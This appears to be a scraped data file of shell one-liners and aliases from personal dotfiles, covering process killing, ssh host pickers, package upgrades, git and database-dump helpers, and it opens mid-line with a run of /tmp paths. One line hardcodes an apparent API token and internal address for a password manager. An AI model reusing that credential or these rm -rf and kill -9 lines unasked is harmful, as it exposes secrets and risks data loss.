/tmp/ycoluhrp /tmp/ycowexoy /tmp/ycpbxaaw /tmp/ydbannad /tmp/yddhqiji /tmp/ydfethbc /tmp/ydfkuqac /tmp/ydfzkwuk /tmp/ydhougpl /tmp/ydimlwvi /tmp/ydlabgyz /tmp/ydlilzui /tmp/ydmkyatm /tmp/ydnapmyo /tmp/ydtraiiv /tmp/ydxzvdhp /tmp/ydzefgag /tmp/yebqfrjw /tmp/yecppwck /tmp/yejgwnwf_scr1.ir /tmp/yejpcfyq /tmp/yelgdfvt /tmp/yemkqlgq /tmp/yexzawhe /tmp/yezltqii /tmp/yfdtxoyi /tmp/yfeypdsc /tmp/yffqtlww /tmp/yfglpnqj_minimal_grep_8_seq.ir /tmp/yflpbhuu /tmp/yfotlblo /tmp/yfwvtpzv /tmp/yfxgfsvw /tmp/ygaqtxzs /tmp/yggmxrbj /tmp/yghbpvpg_semantics.var.alt.nullifs.ir /tmp/ygimnhqc /tmp/ygirkjyg /tmp/ygmqfynp /tmp/ygoazxfu_micro_1000_8_seq.ir /tmp/ygsbfbfu /tmp/ygtmgerr /tmp/ygtpnonx /tmp/ygvhznjc /tmp/yhajlwvf /tmp/yhakkbbm /tmp/yhblfgci /tmp/yhforoqn /tmp/yhlsrfoc /tmp/yhntpyhf_builtin.exec.badredir.ir /tmp/yhsdfmnl /tmp/yhsiajmn /tmp/yhssadnf /tmp/yhsxfmbm /tmp/yhtbferr /tmp/yhtcdqip /tmp/yhtjnohm_comm-par-test_8_seq.ir /tmp/yhwzojrv /tmp/yihevpbu_deadlock_test_8_seq.ir /tmp/yimyzael /tmp/yinagnom /tmp/yjawmewh /tmp/yjienfzi /tmp/yjmeafdl /tmp/yjpuorzv /tmp/yjrnxrmq_semantics.tilde.ir /tmp/yjvcxlah /tmp/ykfbhzvi /tmp/ykktltbu /tmp/ykoeghiw /tmp/ykpjzaks /tmp/ykqemfqj /tmp/ykscvpii /tmp/ykxrkhxy /tmp/ykziozvn /tmp/ylextval /tmp/ylsjkdas /tmp/ylwjvvct /tmp/ymaynykz /tmp/ymbggmof /tmp/ymcjfxxg /tmp/ymfjwrbe /tmp/ymfpcgaq /tmp/ymkezlju /tmp/ymlylfal /tmp/ymmajsuq /tmp/ymvdvnfs /tmp/ymvlngxm /tmp/ymvyyjjj /tmp/yndaaffw /tmp/ynlxwntb /tmp/ynrcwhci /tmp/ynrlryxn /tmp/yntyrhkr /tmp/ynyfekpw /tmp/ynyytgwi /tmp/ynzrgrje /tmp/yodkarlx /tmp/yoglezno /tmp/yogskskx /tmp/yohjygrv /tmp/yoltykjc /tmp/yonlikai /tmp/yovjpocq /tmp/yoxhyfda /tmp/ypfluewq /tmp/ypgscwog /tmp/yplwbsel /tmp/ypoqtvua /tmp/yppfatvm /tmp/ypyzrpxj /tmp/ypzodfme /tmp/yqbsilrg /tmp/yqkmhbed /tmp/yqldcrvo /tmp/yqnzszax /tmp/yraooszk /tmp/yrevftgo /tmp/yrhscuiu /tmp/yrldadbf /tmp/yrojexsd /tmp/yrrmljxp_set-diff_2_seq.ir /tmp/yrtgdxyy /tmp/yrukvdut /tmp/yrxtfmkl /tmp/yrzwhftm /tmp/ysbhhmsm /tmp/ysbnoyrt_hello-world.ir /tmp/ysdbwoou /tmp/ysoxerpd /tmp/ysqmxkwg /tmp/yssrsuui /tmp/ystvtbfe /tmp/ystwwzqw /tmp/ysxxjbci /tmp/ytbqhkls /tmp/ytfzubws /tmp/ythfhmfk /tmp/ytizhntl /tmp/ytnhbrsx /tmp/yttuteib /tmp/ytwxztiw_builtin.break.lexical.ir /tmp/ytxolgvy /tmp/ytzfltsb /tmp/yubdcffc /tmp/yufblpji /tmp/yugbsldl /tmp/yugzqmrr /tmp/yujaxoxv /tmp/yujwtstu /tmp/yuoddbqz /tmp/yurisiiw /tmp/yuvaiawm /tmp/yuxitajr /tmp/yvdgqyxz /tmp/yvdwgrbq /tmp/yvhwnjep /tmp/yvmxyrca /tmp/yvrcqtkh /tmp/yvrkrczb /tmp/yvsreezo /tmp/ywcqdkon /tmp/ywdouukp /tmp/ywgogltj /tmp/ywhxcypo /tmp/ywnpkpna /tmp/ywooukfk /tmp/ywqodcdd /tmp/ywyfsltm /tmp/yxcblkpg /tmp/yxfllvje /tmp/yxhltiuq /tmp/yxsmacny /tmp/yxuvizcp /tmp/yxwemhsf /tmp/yybyrjfk /tmp/yyevunio /tmp/yyhyjtov /tmp/yyiruspa /tmp/yynimsqi /tmp/yysebgwg /tmp/yyyewfry /tmp/yzkegbgf /tmp/yzknkwnw /tmp/yzohjkfb /tmp/yzootluj /tmp/yzpbufgh /tmp/yzrtjejt /tmp/yzsdeksl /tmp/zabpfuzl /tmp/zadyleka /tmp/zaforrrr /tmp/zairfnbu /tmp/zaivldcf /tmp/zarmkwwb /tmp/zaukxytl /tmp/zaxglnfl /tmp/zayzuadp /tmp/zbdajsdi /tmp/zbhbxluz /tmp/zbjalxwo /tmp/zbjkawlk /tmp/zbolviid /tmp/zbpbnwnk /tmp/zbqshwox /tmp/zburzrob /tmp/zbvbrccr /tmp/zchffxht /tmp/zchfuyai /tmp/zcoaqloh /tmp/zcrnxtwi /tmp/zctifpfj /tmp/zdcblgnl /tmp/zdftoevs /tmp/zdgetdop /tmp/zdhnvznl /tmp/zdmelrux /tmp/zdmrehwm /tmp/zdodusuw /tmp/zdtfvavs /tmp/zecyldjy /tmp/zegslqww /tmp/zehiuvvn /tmp/zeofnclq /tmp/zeoqjzfa /tmp/zeqyunzr /tmp/zeytrfws_minimal_sort_8_seq.ir /tmp/zfdspzjz /tmp/zffeewxj /tmp/zfhiybdv /tmp/zfrgamvx /tmp/zftyccih /tmp/zfvvkwns /tmp/zfzrqbcs /tmp/zgatqylx /tmp/zgawdkuq_diff_2_seq.ir /tmp/zgbtvrib /tmp/zghcbjsp_builtin.unset.ir /tmp/zgizzkvz /tmp/zgkcsbtb /tmp/zglnfjlv /tmp/zgoivkyc /tmp/zgxtcyrd /tmp/zgybbiki /tmp/zhnnjfoh /tmp/zhrwodus /tmp/zhzkwzeh /tmp/ziajctdo /tmp/zidlphwt /tmp/zidnwohb /tmp/zidqktyq /tmp/zietexal /tmp/zifpjebc /tmp/zigezrue /tmp/zihrjevp /tmp/zikswdlk /tmp/zikwemmc /tmp/zioqhjyd /tmp/zitgrvok /tmp/zizcltem /tmp/zjamwpfy /tmp/zjbvrpmo /tmp/zjdzbvhj /tmp/zjfjvjfo_semantics.expansion.quotes.adjacent.ir /tmp/zjftbvhz /tmp/zjjitwby /tmp/zjkwcufz /tmp/zjmcursi /tmp/zjmstptp /tmp/zjvthhju /tmp/zjyllhcj /tmp/zkgremgj /tmp/zkopfivt /tmp/zktvlgwk /tmp/zkvxfdus /tmp/zllhkpjk /tmp/zlmnxjqv /tmp/zlzcbfgj /tmp/zmcurnwn /tmp/zmfnunda /tmp/zmiefuqz_semantics.expansion.heredoc.backslash.ir /tmp/zmuqojrv /tmp/znbdaojo /tmp/znfnnxww /tmp/znftwgvv /tmp/zniiktee /tmp/znjuojfv /tmp/znkqpuic /tmp/znmbcnep_comm-par-test2_8_seq.ir /tmp/znmvuuri /tmp/znofhepq /tmp/znokfdej /tmp/znphivqy /tmp/znvqagro /tmp/zoahyuuq /tmp/zobkjlfr /tmp/zobztudz /tmp/zofobvqp /tmp/zohtmbiu /tmp/zonxazns /tmp/zoqetkda /tmp/zorjcxsr /tmp/zpbfhyng /tmp/zpcxwjor /tmp/zpdffsds /tmp/zpdgcazs /tmp/zphkcjvh /tmp/zpkefwqn /tmp/zprtyiii /tmp/zpskzwjt /tmp/zqafdnue_semantics.evalorder.fun.ir /tmp/zqchjuvo /tmp/zqeejhyl /tmp/zqiwpkgt /tmp/zqjxbiys /tmp/zragmuzq /tmp/zrawgbvk /tmp/zrdubtok /tmp/zrejrrbk /tmp/zrgsmpej /tmp/zrrhoqok /tmp/zrtswhrp /tmp/zsfomuyp /tmp/zskgxhfw /tmp/zspsndzn /tmp/zsxwggql /tmp/zsyvquva /tmp/zsyymzuw /tmp/ztbsbdmw /tmp/ztgvyfuj /tmp/ztgxnxuu_semantics.ifs.combine.ws.ir /tmp/ztjmdiws /tmp/ztrounwk /tmp/zttzdqky /tmp/ztvhjxjz /tmp/ztvkphwa /tmp/zufcrbbq /tmp/zuifpmml /tmp/zukgiupj /tmp/zuymodzu /tmp/zuzfwpte /tmp/zvdvexmb_semantics.for.readonly.ir /tmp/zvexpnko /tmp/zvgmxhnu /tmp/zvjtbfym /tmp/zvljvosk /tmp/zvmruhva /tmp/zvqhcovf /tmp/zvrvqjgi /tmp/zvsfskub /tmp/zvsnrpli /tmp/zvtujuag /tmp/zvvbgmso /tmp/zvvuwfmq /tmp/zwcfczky /tmp/zwfethxl /tmp/zwfntcqm /tmp/zwioqlzn /tmp/zwmfcwkq /tmp/zwraljsa /tmp/zwtfeqjr /tmp/zxcovtwc /tmp/zxhlzwrt /tmp/zxhqjaie /tmp/zxmtgrsd /tmp/zxqnvuqn /tmp/zxrkswnz /tmp/zxubatff /tmp/zxyiabtv /tmp/zyazmnak /tmp/zybkpbyh /tmp/zydqkwrt /tmp/zyhfmsgk /tmp/zyljonlr /tmp/zyngxsek /tmp/zyvpvenf /tmp/zywwnogb /tmp/zyykraqz /tmp/zyzxbbjp /tmp/zzfbjnre /tmp/zzngcnna /tmp/zzpiggre /tmp/zzpkyvvw /tmp/zzrufsdp /tmp/zzxfvwoj /tmp/zzxsttyc /tmp/zzymtbjd /tmp/zzytlmpu /tmp/zzzooswl | sort -rn | head -20 | cut -f2-"
"stash=$(git stash list | fzf --preview ""git diff \$(echo {} | egrep -oh \""^[^:]*\"")"" | egrep -oh ""^[^:]+"") && git stash pop ""$stash"""
"st(){curl ipinfo.io && speedtest --server $(speedtest --list | grep "")"" | fzf | cut -f1 -d"")"" ) }; st"
"st |grep -E ""^No local changes to save$"" && a=0 || a=1 ; git rebase -i HEAD~2 ; [ ""$a"" -eq ""1"" ] && pop"
"st |grep -E ""^No local changes to save$"" && a=0 || a=1 ; git rebase -i HEAD~10 ; [ ""$a"" -eq ""1"" ] && pop"
"st |grep -E ""^No local changes to save$"" && a=0 || a=1 ; fu ; reu ; [ ""$a"" -eq ""1"" ] && pop"
"st |grep -E ""^No local changes to save$"" && a=0 || a=1 ; f ; rem ; [ ""$a"" -eq ""1"" ] && pop"
"st |grep -E ""^No local changes to save$"" && a=0 || a=1 ; f ; red ; [ ""$a"" -eq ""1"" ] && pop"
"st | grep -E ""^(\?|\~|---)"""
"st | grep -E ""^(M|R|---)"""
"sst | grep -v ^对 | grep -v ^Performing | grep -v ^$ \
"ssh-keyscan localhost 2> /dev/null | tee /dev/stderr | ssh-keygen -vlf - | sed ""s:^[0-9]*:Fingerprint :"""
"ssh-add -l|grep -v ""The agent has no identities"" || ssh-add && unalias ssh && ssh"
"ssh-add -l|grep -v ""The agent has no identities"" || ssh-add && unalias git && git"
"ssh tomservo ""cd /data/db && cat \$(ls -S1 cms*.gz|head -n 1)""|gzip -d|psql -U jorenza -h 172.17.0.1 -f - cms"
"ssh shallowhalext ""cd /data/db && cat \$(ls -S1 cms*.gz|head -n 1)""|gzip -d|psql -U jorenza -h 172.17.0.1 -f - cms"
"ssh shallowhal ""cd /data/db && cat \$(ls -S1 cms*.gz|head -n 1)""|gzip -d|psql -U jorenza -h 172.17.0.1 -f - cms"
"ssh server ""ls -l /etc/cnames/stations"" | grep ""^l"" | awk ""{print \$8 \"" (node \"" substr(\$10,10) \"")\""}"" | sort"
"ssh server ""ls -l /etc/cnames/rooms"" | grep ""^l"" | awk ""{print \$8 \"" (node \"" substr(\$10,10) \"")\""}"" | sort"
"ssh elf@app.washcyclelaundry.com ""pg_dump -Fc --no-acl --no-owner elf_production --exclude-table=page_requests | gzip"" | gzip -d |pg_restore --verbose --clean --no-acl --no-owner -d elf_development"
"ssh `grep ""Host "" ~/.ssh/config | grep -v ""\*"" | cut -b 6- | peco --prompt ""HOST > ""`"
"ssh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config|grep deploy|peco|awk ""{print \$2}"")"
"ssh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config|grep -v \*|peco|awk ""{print \$2}"")"
"ssh $(grep ""^\s*Host "" ~/.ssh/config | sed s/""[\s ]*Host ""// | grep -v ""^\*$"" | peco)"
"ssh $(cat ~/.ssh/config | ag Host | cut -d"" "" -f2- | fzf)"
"sort | uniq -c | sort -k1,1 -rn | awk -v OFS='\t' '{ print \$2, \$1 }'"
"sort -R /tmp/lolimpdnu.cache | head -n1 | sed ""s/.*\t//"" | xargs lolimpd play"
"softwareupdate -ia && brew update && brew upgrade && gem update && npm --silent --global update && pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs pip install -U"
"slack-cli -d sharbot ""allocate"" && sleep 5 && slack-cli -d sharbot ""super extend"" && slack-cli -l 3 -s sharbot | grep -oE ""\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"" | cut -f 1 | xargs sudo python /Users/itai/dev/mui/tools/ui-proxy"
"sk -i -c ""scrapq search {}"" | cut -f1 | xargs -i scrapq get {} | vim -R -c ""setf scrapbox"" -"
"sinfo |grep -E ""et4p|et2|et1"""
"session_file=Session$(echo ${TMUX_PANE-} | sed ""s/\%//"").vim; [ -f $session_file ] && /usr/local/bin/vim -S ""$session_file"" || /usr/local/bin/vim"
"session_file=Session$(echo ${TMUX_PANE-} | sed ""s/\%//"").vim; [ -f $session_file ] && /usr/local/bin/nvim -S ""$session_file"" || /usr/local/bin/nvim"
"sensors | grep ""Exhaust\|Physical\|Core"""
"sensors | grep ""(Core|fan1|temp1)"""
"selectr mu find -t -s d --reverse -f \""d f s [g]\|\|l\"" \""%\"" \| head -n 40"
"sed -u ""s/^\([^|]*\)| //g"" | bunyan -o short"
"sed -re ""s|http(s?\:\/\/[[:alnum:]\.]*)\.([[:alnum:]]*\/?)|hxxp\1[.]\2|g"""
"sed -n -e '/\[\(CRITICAL\|WARNING\) *\]/,/\[\(DEBUG\|INFO\) *\]/ { /\[\(DEBUG\|INFO\) *\]/b; p }'"
"sed -e ""s|^\([^:]*\)\(:\)\([0-9]*\)\(:\)|\x1B[35m\1\x1B[36m\2\x1B[32m\3\x1B[36m\4\x1B[0m|"""
"sed -e ""s|\.|[\.]|g"""
"sed -e ""s|<[^>]*>||g"""
"sed -e ""s|/[^/]\+$||g"""
"sed -e ""s/^[^|]*|\t//"" | jq ."
"sed -e ""s#¤#|#"" -e ""s#:#¤#"" | column -t -s ""¤"" -o "" | """
"sed -e ""/^\(\t\| \)*#.*\|^\(\t\| \)*$/d"" -e ""s/\(.*\)#.*/\1/"" ""$@"""
"sed 's/$/,/ ' | tr '\n' ' ' | sed 's/^/\[/' | sed 's/$/\]\n/'"
"sed ""s|^\(.*\)$|\""\1\""|g"""
"sed ""s|[/]\+|/|g"""
"sed ""$(sed -nr ""{s/.*(..:..:..:..:..:..)[[:space:]]+([^[:space:]]+).*/s|\2|\1|Ig;/p}"" /etc/bat-hosts)"""
"sed ""$(sed -nr ""{s/.*(..:..:..:..:..:..)[[:space:]]+([^[:space:]]+).*/s|\1|\2|Ig;/p}"" /etc/bat-hosts)"""
"sd ""\""|\x27|\`"" """" | batrb"
"scselect | sed -e 1d -e ""s/[^(]*(\(.*\))/\1/g"" | peco --prompt ""Select network env:"" | xargs scselect"
"scrot -e ""[ -e ~/shots ] || mkdir ~/shots && mv \$f ~/shots/ 2>&1 | grep -v \""are the same file\"" >&2"""
"script -q /dev/null ls -lAGhp | sort -f -d -k 1.1,1.1r -k 9 | tr -d '\r' | cat"
"screen -ls | grep Detached | awk ""{ print $1}""| xargs -L 1 -I % screen -S % -X quit"
"screen -ls | grep -ioP ""^\t.+?\."" | sed -s ""s/\t//g;s/\.//g"" | xargs kill"
"screen -ls | grep ""^No Sockets"" && screen ~/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/tty || screen -r"
"rvm list gemsets | grep = | sed ""s/=>//g"" | sed ""s/\[ . .. \]//g"""
"ruby watchr.rb | grep -Ei ""FAIL|ERROR"" | grep -v ""fail: 0, error: 0"""
"ruby -e ""p \$stdin.read.split.map{ |f| f.split(\""/\"").last.strip }.uniq.join(\""|\"")"""
"rspec $(git st | grep ""...spec/.*_spec.rb"" | cut -c 4- | xargs)"
"route get default | grep gateway | cut -d "":"" -f2 | xargs echo"
"root&vimlog logs/SCTs/`ls -lart logs/SCTs/ | tr -s "" "" |cut -d"" "" -f9 | tail -n1`"
"rnd_file=$(find /usr/include -type f -size +5k | sort -R | head -n 1) && vim +$((RANDOM%$(wc -l $rnd_file | cut -f1 -d"" ""))) $rnd_file"
"rm tags ; ack -f | sed -e ""s/^/\""/"" | sed -e ""s/$/\""/"" | xargs ctags -a"
"rm -rf $(ls -a | grep -vxE ""\.|\.\.|.git"") && git checkout ."
"rig | sed ""s/xxx-xxxx/$(echo $RANDOM | cut -c 1-3)-$(echo $RANDOM | cut -c 1-4)/"""
"rg -e ""^[a-z]+$"" /usr/share/dict/words | sort -R | head -25 | xargs -L 5 echo"
"rg -e ""(TODO|FIXME|OPTIMIZE|REVIEW)"""
"rg ""^(<|>|=){7}($| )"""
"read -s tmppass; echo -n ""$tmppass->""; echo $tmppass | md5sum | base64 | cut -c -16; unset tmppass"
"rattic --endpoint=http://10.0.2.35 --user=rattic --token=""bc6817c8f2ee251913471af8559c14c728ebed04"" list | peco | rattic --endpoint=http://10.0.2.35 --user=rattic --token=""bc6817c8f2ee251913471af8559c14c728ebed04"" show --fields=password | pbcopy"
"railgun status -a | tail -n +2 | cut -d "" "" -f1 | xargs -n 1 railgun stop"
"qstat|grep ${USER}|cut -f 1 -d "" ""|xargs qdel"
"qstat -u $USER | grep ""$USER"" | cut -d ""."" -f1 | xargs qdel"
"python /usr/bin/ufs_trace_tool.py -c | tac | grep ""command done"" -m1 -A30 | tac"
"pyenv local $(pyenv versions | \grep -oE ""3\.[0-9]+\.[0-9]+"" | sort -r | head -n 1)"
"pyenv local $(pyenv versions | \grep -oE ""3\.7\.[0-9]+"" | sort -r | head -n 1)"
"pyenv local $(pyenv versions | \grep -oE ""3\.6\.[0-9]+"" | sort -r | head -n 1)"
"pyenv local $(pyenv versions | \grep -oE ""3\.5\.[0-9]+"" | sort -r | head -n 1)"
"pyenv local $(pyenv versions | \grep -oE ""2\.7\.[0-9]+"" | sort -r | head -n 1)"
"pwgen -cnB 8 10 | while read PASS; do echo -n ""$PASS\t""; echo -n ""$PASS"" | md5sum | cut -f1 -d"" ""; done"
"pwgen -Bsy 28 1 | tr -d ""\n"" | pbcopy | pbpaste"
"pwd|tr -d ""\r\n""|pbcopy|echo ""current path copied to clipboard"""
"pwd | tr -d ""\r\n"" | xclip -selection clipboard | echo ""=> Current working dir copied to clipboard"""
"pwd | sed ""s/\ /\\\ /g"" | tr ""\n"" ""/"" | pbcopy"
"pwd | rev | cut -d""/"" -f 1 | rev"
"pwchars=""alnum punct""; for chars in `echo $pwchars |sed ""s/ /\n/""`; do charset=""[:$chars:]$charset""; tr -dc ""$charset"" < /dev/urandom | fold -w 24 |head -n5; done; unset charset"
"pwchars=""alnum punct""; for chars in `echo $pwchars |sed ""s/ /\n/""`; do charset=""[:$chars:]$charset""; tr -dc ""$charset"" < /dev/random | fold -w 24 |head -n5; done; unset charset"
"pushd ~/Pictures && cat ~/.optipng_queue | xargs -n 1 find . -iname | xargs -n 1 -I {} printf ""%q\n"" ""{}"" | xargs -n 1 optipng -o4 && printf """" > ~/.optipng_queue && popd"
"pushd ${vagrant_ceph_path};vagrant ssh-config | grep -A1 'Host admin' | tail -n1 | grep -E -o '([0-9]{1,3}[\.]){3}[0-9]{1,3}'"
"pushd ${APPLECORE}; git branch --merged | grep -v ""\*"" | grep -v ""release/*"" | xargs -n 1 git branch -d; popd"
"pswide.sh | egrep ""^\s*($USER|`id -u`)"" | what-is-running.pl"
"psaux indicator-china-weather | grep -v color | awk ""{print \$2}"" | xargs kill -9 && start-stop-daemon --exec /usr/bin/indicator-china-weather --start --background"
"ps | grep -Ev ""grep|ps|zsh"""
"ps | fzf | awk ""{ print $1 }"" | xargs peep; noti"
"ps | fzf -m | awk ""{ print \$1 }"" | xargs kill -9"
"ps x | grep simtgCorba | grep -v grep | awk ""{ print $1 }"""
"ps wwaxro f,pid,ppid,uid,pcpu,time,start,vsz,tty,command | awk 'NR < 2 || \$1 ~ \"
"ps o user,pid,comm,args,pcpu,size,state -C bash -N -C xterm |egrep ""$USER|USER""|sed ""s/^........//"""
"ps axww -o pid,user,%cpu,%mem,start,time,command | selecta | sed 's/^ *//' | cut -f1 -d' '"
"ps axww -o pid,user,%cpu,%mem,start,time,command | hs | sed 's/^ *//' | cut -f1 -d' '"
"ps axww -o pid,user,%cpu,%mem,start,time,command | fzy | sed 's/^ *//' | cut -f1 -d' '"
"ps axww -o pid,user,%cpu,%mem,start,time,command | fzf | sed 's/^ *//' | cut -f1 -d' '"
"ps axo %cpu,%mem,comm |sort -unr| head -n 9 | ccze -A"
"ps ax | grep -o /data[/].*[/] | cut -f3 -d""/"" | sort -u"
"ps ax | filter | awk ""{ print $1 }"" | xargs kill"
"ps ax -o pid,command,ppid | grep 'zsh' | awk '{print $1}' | xargs kill -9"
"ps ax -o command,pid | grep '^nm-applet' | grep -Po '\d+$' | xargs kill && nm-applet 2> /dev/null &"
"ps aux|grep train.py|awk ""{print $2}""|xargs kill -9"
"ps aux|grep %[C]PU ; ps aux | sort -nrk3,3 | head -n10"
"ps auxwww|grep ""${H}""|grep -v grep|grep"
"ps auxwww | head -n 1; ps auxwww | grep -v ""grep -i"" | grep -i "
"ps auxwww | grep -E ""(org\.jboss|8080)"" | awk "
"ps aux | tr ""\n"" ""\0"" | xargs -0 -n1 echo | grep -i $1"
"ps aux | sort -k3 -r | head -n 3 | awk '{ print$3, \"
"ps aux | sort -k 4,4 | tail | tac"
"ps aux | sort -k 3,3 | tail | tac"
"ps aux | sort --key 4 | awk ""{if (NF<12) { print \$1\"",,,\""\$2\"",,,\""\$3\"",,,\""\$4\"",,,\""\$9\"",,,\""\$10\"",,,\""\$11} else { print \$1\"",,,\""\$2\"",,,\""\$3\"",,,\""\$4\"",,,\""\$9\"",,,\""\$10\"",,,\""\$11\""...\"" }}"" | column -t -s "",,,"""
"ps aux | sort --key 3 | awk ""{if (NF<12) { print \$1\"",,,\""\$2\"",,,\""\$3\"",,,\""\$4\"",,,\""\$9\"",,,\""\$10\"",,,\""\$11} else { print \$1\"",,,\""\$2\"",,,\""\$3\"",,,\""\$4\"",,,\""\$9\"",,,\""\$10\"",,,\""\$11\""...\"" }}"" | column -t -s "",,,"""
"ps aux | percol | awk ""{ print \$2 }"" | xargs kill"
"ps aux | peco | awk ""{print \$2}"" | xargs"
"ps aux | peco | awk ""{print \$2}"" | xargs kill"
"ps aux | peco | awk ""{print \$2}"" | xargs -i% cat /proc/%/status"
"ps aux | peco | awk ""{ print \$2 }"" | xargs kill"
"ps aux | head -n 1 ; ps aux | \grep $(echo $1 | sed ""s/^\(.\)/[\1]/g"")"
"ps aux | head --lines=1 && ps aux | grep --invert-match ""grep"" | grep"
"ps aux | grep rails | grep -v grep | awk '{print \$2, \$12, \$13, \$14, \$15}'"
"ps aux | grep php-fpm | wc -l ; ps --no-headers -o ""rss,cmd"" -C php-fpm | awk "
"ps aux | grep -v ""ps aux"" | grep -Ev ""\[.+\]"" | grep -v grep"
"ps aux | grep -i ""/Applications/Google Chrome.app"" | awk ""{print $2}"" | xargs sudo kill -9"
"ps aux | grep -P ""(tail|taildir|inotifywait)"""
"ps aux | grep -E ""vim|ranger|tmux"""
"ps aux | grep ""ssh"" | grep ""\-f"" | awk "
"ps aux | grep ""ruby -run -ehttpd"" | grep -v grep | awk "
"ps aux | grep ""Sublime Text"" | awk ""{ print $(2) }"" | xargs kill"
"ps aux | ack firefox | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack chrome | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""[Ss]ublime"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""Visual Studio Code\.app"" | awk ""{print \$2}"" | xargs kill -9"
"ps -o pid,pmem,pcpu,command -A | sort -n -r -k 3 | head -15 | awk '{printf \"
"ps -o pid,pmem,pcpu,command -A | sort -n -r -k 2 | head -15 | awk '{printf \"
"ps -o command -p $$ | tail -n +2 | cut -d"" "" -f1 | sed ""s/[^a-zA-Z]//"""
"ps -eorss,args | sort -nr | pr -TW$COLUMNS | head"
"ps -eorss,args | sort -nr | head -100 | awk '{print \$1/1024\"
"ps -eorss,args | sort -nr | cut -c-156 | head"
"ps -eo user,pid,ppid,pcpu,cpu,pmem,rss,cmd --sort -pcpu --width $COLUMNS | numfmt --header --to=iec --field 7 --padding 6 | cut -c 1-$COLUMNS | head -n $(($LINES-5))"
"ps -eo rss,comm | awk '/Atom/ {print $1}' | paste -sd + - | bc"
"ps -eo pmem,pcpu,pid,args | tail -n +2 | sort -rnk 2 | head"
"ps -eo pid,ni,cmd | grep synergy | grep -v grep | cut -d"
"ps -eo pid,ni,args | grep synergy | grep -v grep | cut -d"
"ps -eo pid,args | pgrep 'node rtdrawjs-dev/server.js' | sed 's/\([0-9]*\) .*/\1/' | xargs kill"
"ps -eo pid,args | grep ""org.apache.catalina.startup.Bootstrap start"" | grep -v grep | cut -c1-6"
"ps -eo ""%U %p %P %x %c %a""|head -1 >&2; ps -eo ""%U %p %P %x %c %a""|egrep -vE ""[[:space:]]*[[:digit:]]+[[:space:]]+[[:digit:]]+[[:space:]]+grep""|grep"
"ps -ef|grep java|grep kafka|grep -v grep ; echo """" ; jps ; echo """" "
"ps -ef|grep java|grep hadoop|grep -v grep ; echo """" ; docker ps "
"ps -ef|grep -Ev ""grep |ps ""|grep -i "
"ps -ef|egrep ""nmb|smb|ctdb"""
"ps -ef | grep python | awk '{print \\\$2}' | xargs -I{} kill -9 {}\"""" >> $bashrc_path"
"ps -ef | grep `whoami` | grep -v grep | grep -v ""ps -ef"""
"ps -ef | grep -v grep | grep -v ""ps -ef"" | grep"
"ps -ef | grep -v ""grep"" | grep ""root"" | grep "
"ps -ef | grep ""ssh -D 8080"" | grep -v grep | awk "
"ps -ef | egrep -v ""grep --color=auto | egrep --color"" | egrep --color"
"ps -e -orss=,args=|sort -b -k1,1n|pr -TW$COLUMNS|grep -v '0 \['"
"ps -e -orss=,args= | sort -b -k1,1n | pr -TW$COLUMNS | tail -n 20; free -h"
"ps -e -o ""user pid ppid s pcpu nice vsz stime tty time args"" | sort | grep -v root | more"
"ps -axc | grep ""\!*"" | grep -v ""grep"" | cut -d"" "" -f3"
"ps -ax | fzf | cut -d "" "" -f1 | xargs -o kill"
"ps -aux |& fgrep $USER | fgrep -v ""ps -aux"" | fgrep -v ""fgrep"""
"ps -aux | grep java | grep -v grep | awk '{print \\\$2, \\\$NF}'"
"ps -aux | grep `whoami` | grep -v grep | grep -v ""ps -aux"""
"ps -au | grep ubuntu | grep 'Xtightvnc\s:' | awk '{print \$2, \$11, \$12}'"
"ps -W | grep ""jupyter-notebook"" | awk ""{print \$1}"" | xargs kill -f"
"ps -U $(whoami) -ef | grep i3lock | awk ""{print $2}"" | xargs kill"
"ps -Ao pid,comm,args | sed 's/^ *//'| sed 's/:/ /'|grep -iE"
"ps -Af | grep -w PPID |grep -v ""grep -w PPID"" && ps -Af | egrep -ie"
"ps -Aco pid,comm | sed 's/^ *//'| sed 's/:/ /'|grep -iE"
"prod-instances | tail -n1 | sed -e 's/.*,/ssh ec2-user@/' | pbcopy"
"processes=`ps aux`; echo ""$processes"" | head -n1; echo ""$processes"" | sort -rnk 4 | head -20"
"processes=`ps aux`; echo ""$processes"" | head -n1; echo ""$processes"" | sort -rnk 3 | head -20"
"printf ""what to kill? => ""; victim=;read victim;ps -A | grep $victim | awk ""{print $1}"" | xargs -r kill"
"printf ""Find top 10 largest files in /var directory\n"";tree -ihafF /var | tr ""[]"" "" ""| sort -k1hr|head -10"
"printenv | grep -v ""^LS_COLORS="" | sort | grep -Ee ""^[^=]+="""
"print -z $( alias | tr = ""\t"" | fzf --preview-window=right:hidden | cut -f 1)"
"primewireLink=$(primewire $@ | grep -i openload | head -1 | xargs youtube-dl -g) && curl -sI ""http://autoremotejoaomgcd.appspot.com/sendmessage?key=$AUTOREMOTE_TV&message=play=:=$primewireLink"""
"pnext1 && pregs1 | sed -n 3p && pregs1 | sed -n -e 12,24p | awk "
"pmset -g log |grep -E ""Kernel Idle sleep preventers: (-None-|IODisplayWrangler)"" |tail -n20"
"pmset -g batt | grep Internal | awk ""{print $2}"" | sed ""s/;//"""
"pmset -g batt | grep ""%"" | awk ""{print \$3}"" | sed s/\;//g"
"playbook=""$(ag -c --depth=1 -G "".*\.yml"" ""\- name:"" ./ | cut -d "":"" -f1 | cut -d ""."" -f1 | fzf)""; ansible-playbook ""${playbook}.yml"""
"pkill -9 ""gdb|xstg|fsim|pmi_proxy"""
"pip3 list --outdated --format=freeze | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip3 install -U"
"pip3 list --outdated --format=freeze | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip3 install -U --user"
"pip3 list --format=columns | sed -e '1,2d' | cut -d' ' -f1 | xargs pip3 --no-cache-dir install -U"
"pip3 freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs pip3 install -U"
"pip3 freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 sudo -H pip3 install -U"
"pip3 freeze -- local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip3 install --user -U"
